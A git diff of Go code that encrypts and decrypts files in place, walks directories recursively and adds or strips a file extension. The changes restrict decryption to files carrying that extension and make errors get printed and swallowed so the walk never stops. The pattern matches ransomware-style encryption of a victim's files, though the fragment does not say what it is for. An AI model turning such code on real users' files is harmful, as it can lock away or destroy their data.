@@ -64,6 +64,9 @@ func EncryptFile(path string, key []byte) error {
 		return nil
 	}
 
+	//Think of a faster way to get the file's extension
+	//if strings.Split()
+
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
 		//Think of a fix, if the error isn't nil the walk function exits, so we return nil even on errors
@@ -86,18 +89,26 @@ func EncryptFile(path string, key []byte) error {
 }
 
 func DecryptFile(path string, key []byte) error {
+	//Do not decrypt anything that doesnt have the specific extension
+	if !strings.HasSuffix(path, extension) {
+		return nil
+	}
+
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
-		return err
+		fmt.Println(err)
+		return nil
 	}
 	data = Decrypt(key, data)
 	err = ioutil.WriteFile(path, data, 0644)
 	if err != nil {
-		return err
+		fmt.Println(err)
+		return nil
 	}
 
 	err = os.Rename(path, strings.TrimSuffix(path, extension))
-	return err
+	fmt.Println(err)
+	return nil
 }
 
 func RecursivelyEncryptDirectory(startingPath string, key []byte) error {
